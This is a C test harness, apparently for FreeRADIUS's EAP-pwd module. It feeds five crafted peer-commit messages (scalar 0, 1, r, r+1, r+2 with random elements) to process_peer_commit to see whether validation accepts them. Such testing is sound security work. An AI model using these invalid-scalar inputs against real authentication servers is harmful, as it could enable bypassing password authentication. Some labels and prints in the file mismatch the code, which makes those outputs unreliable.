#include "eap-pwd.h"
#include "utils.h"

int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s <attack number>\n\n", argv[0]);
        printf("Return code indicates whether or not the attack was successful.\n");
        printf("Known attacks:\n");
        printf("\t1. scalar_p = 0, element_p = random\n");
        printf("\t2. scalar_p = 1, element_p = random\n");
        printf("\t3. scalar_p = r, element_p = random\n");
        printf("\t4. scalar_p = r + 1, element_p = random\n");
        printf("\t5. scalar_p = r + 1, element_p = random\n");
        return 1;
    }

    BN_CTX *bnctx = BN_CTX_new();
    pwd_session_t session;

    /* Not used by process_peer_commit */
    session.state = 0;
    session.group_num = 0;
    session.ciphersuite = 0;
    session.token = 0;
    memset(session.peer_id, 0, MAX_STRING_LEN);
    session.peer_id_len = 0;
    session.mtu = 0;
    session.in = NULL;
    session.in_pos = 0;
    session.in_len = 0;
    session.out = NULL;
    session.out_pos = 0;
    session.out_len = 0;
    memset(session.my_confirm, 0, SHA256_DIGEST_LENGTH);

    /* Things we need to specify */

    // compute_password_element() -- eap_pwd.c#L139
    session.group = EC_GROUP_new_by_curve_name(NID_X9_62_prime256v1);

    // compute_password_element() -- eap_pwd.c#L158
    session.order = BN_new();
    if (!EC_GROUP_get_order(session.group, session.order, NULL)) {
        DEBUG("Unable to get order for curve");
        return -1;
    }

    // compute_password_element() -- eap_pwd.c#L153
    session.prime = BN_new();
    if (!EC_GROUP_get_curve_GFp(session.group, session.prime, NULL, NULL, NULL)) {
        DEBUG("Unable to get prime for GFp curve");
        return -1;
    }

    // Generate a random point to emulate an unknown shared secret.
    session.pwe = get_random_EC_POINT(session.group, session.order, bnctx);
    assert(session.pwe != NULL);

    // For sanity:
    print_point("PWE: ", session.group, session.pwe, bnctx);

    // Generate a random private value
    // compute_scalar_element -- eap_pwd.c#L274
    session.private_value = get_random_max(session.order);
    assert(session.private_value != NULL);

    // For sanity:
    print_bn("s_rand / private_value: ", session.private_value);

    // Generate a random private mask
    // compute_scalar_element -- eap_pwd.c#L278
    BIGNUM *private_mask = get_random_max(session.order);
    assert(private_mask != NULL);

    // For sanity:
    print_bn("s_mask: ", session.private_value);

    // Generate scalar
    // compute_scalar_element -- eap_pwd.c#L282
    session.my_scalar = compute_eap_pwd_scalar(session.private_value, private_mask, session.order, bnctx);
    assert(session.my_scalar != NULL);

    // For sanity:
    print_bn("scalar_s / my_scalar: ", session.my_scalar);

    // Generate element
    // compute_scalar_element -- eap_pwd.c#L285
    session.my_element = compute_eap_pwd_element(session.pwe, private_mask, session.group, session.order, bnctx);
    assert(session.my_element != NULL);

    // For sanity:
    print_point("element_s / my_element: ",  session.group, session.my_element, bnctx);

    /* Things we copy/create in process_peer_commit */
    session.peer_scalar = NULL;
    session.peer_element = NULL;
    session.k = NULL;


    /* Here comes the fun part -- attacks! */

    BIGNUM *scalar_p = NULL;
    EC_POINT *element_p = NULL;

    if (strcmp(argv[1], "1") == 0) {
        scalar_p = BN_new();
        BN_zero(scalar_p);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "2") == 0) {
        scalar_p = BN_new();
        BN_one(scalar_p);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "3") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "4") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        BN_add_word(scalar_p, 1);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else if (strcmp(argv[1], "5") == 0) {
        scalar_p = BN_new();
        BN_copy(scalar_p, session.order);
        BN_add_word(scalar_p, 2);
        element_p = get_random_EC_POINT(session.group, session.order, bnctx);
    } else {
        printf("Unknown attack: %s", argv[1]);
        return 1;
    }

    uint8_t *in;
    size_t in_len;

    print_bn("scalar_p / peer_scalar: ", scalar_p);
    print_point("element_p / peer_element: ", session.group, session.my_element, bnctx);

    /* Encode our attack and try it out. */
    // mod_process -- rlm_eap_pwd.c#L344
    in = encode_attack(&in_len, session.group, session.order, session.prime, element_p, scalar_p, bnctx);

    printf("Wire contents: ");
    for (size_t i = 0; i < in_len; i++) {
        printf("%x", in[i]);
    }
    printf("\n");
    return process_peer_commit(&session, in, in_len, bnctx);
}
